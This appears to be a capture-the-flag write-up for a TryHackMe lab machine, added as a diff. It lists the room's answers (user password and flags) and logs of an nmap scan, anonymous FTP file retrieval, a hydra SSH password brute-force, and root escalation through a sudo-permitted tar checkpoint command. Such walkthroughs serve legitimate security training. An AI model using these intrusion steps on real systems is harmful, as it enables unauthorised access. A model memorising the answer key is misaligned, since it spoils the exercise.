@@ -1,0 +1,193 @@
+===================================================================
+                      QUESTIONS / ANSWERS
+===================================================================
+
+You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 
+
+Answer the questions below
+
+Q: Deploy the machine.
+    =|> NO ANSWER NEEDED
+
+Q: Find open ports on the machine
+    =|> NO ANSWER NEEDED
+
+Q: Who wrote the task list? 
+    =|> lin
+
+Q: What service can you bruteforce with the text file found?
+    =|> ssh
+
+Q: What is the users password? 
+    =|> RedDr4gonSynd1cat3
+
+Q: user.txt
+    =|> THM{CR1M3_SyNd1C4T3}
+
+Q: root.txt
+    =|> THM{80UN7Y_h4cK3r}
+
+
+
+
+
+===================================================================
+                    NMAP SCANNING
+===================================================================
+
+───╼ $nmap -Pn -sV -A 10.10.61.38
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-06 03:23 PKT
+Nmap scan report for 10.10.61.38
+Host is up (0.45s latency).
+Not shown: 967 filtered ports, 30 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.4.27.78
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
+|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
+|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.02 seconds
+
+===================================================================
+                FTP CONNECTION AND FILE DOWNLOAD
+===================================================================
+
+───╼ $ftp 10.10.61.38
+Connected to 10.10.61.38.
+220 (vsFTPd 3.0.3)
+Name (10.10.61.38:hamza): ftp
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+226 Directory send OK.
+
+ftp> get task.txt
+local: task.txt remote: task.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for task.txt (68 bytes).
+226 Transfer complete.
+68 bytes received in 0.07 secs (0.9823 kB/s)
+
+ftp> get locks.txt
+local: locks.txt remote: locks.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for locks.txt (418 bytes).
+226 Transfer complete.
+418 bytes received in 0.06 secs (6.4855 kB/s)
+
+ftp> exit
+211 Goodbye
+
+===================================================================
+                BRUTE FORCING SSH SERVICE
+===================================================================
+
+───╼ $hydra -l lin -P locks.txt 10.10.61.38 -t 4 ssh
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-06 03:50:08
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
+[DATA] attacking ssh://10.10.61.38:22/
+[22][ssh] host: 10.10.61.38   login: lin   password: RedDr4gonSynd1cat3
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-06 03:50:2
+
+===================================================================
+               ACCESSING THE MACHINE USING SSH
+===================================================================
+
+───╼ $ssh lin@10.10.61.38
+The authenticity of host '10.10.61.38 (10.10.61.38)' can't be established.
+ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.61.38' (ECDSA) to the list of known hosts.
+lin@10.10.61.38's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+83 packages can be updated.
+0 updates are security updates.
+
+Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
+
+lin@bountyhacker:~/Desktop$ ls
+user.txt
+
+lin@bountyhacker:~/Desktop$ cat user.txt 
+THM{CR1M3_SyNd1C4T3}
+
+lin@bountyhacker:~/Desktop$ sudo -l
+[sudo] password for lin: 
+Matching Defaults entries for lin on bountyhacker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+
+lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+tar: Removing leading `/' from member names
+
+root@bountyhacker:~/Desktop# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@bountyhacker:~/Desktop# cd
+
+root@bountyhacker:~# cd ..
+
+root@bountyhacker:/home# cd ..
+
+root@bountyhacker:/# ls
+bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
+boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
+cdrom  home  lib             media       proc  sbin  sys   var
+
+root@bountyhacker:/# cd root
+
+root@bountyhacker:/root# ls
+root.txt
+
+root@bountyhacker:/root# cat root.txt 
+THM{80UN7Y_h4cK3r}
+
+root@bountyhacker:/root# 
+
+===================================================================
+
+
+
+
+
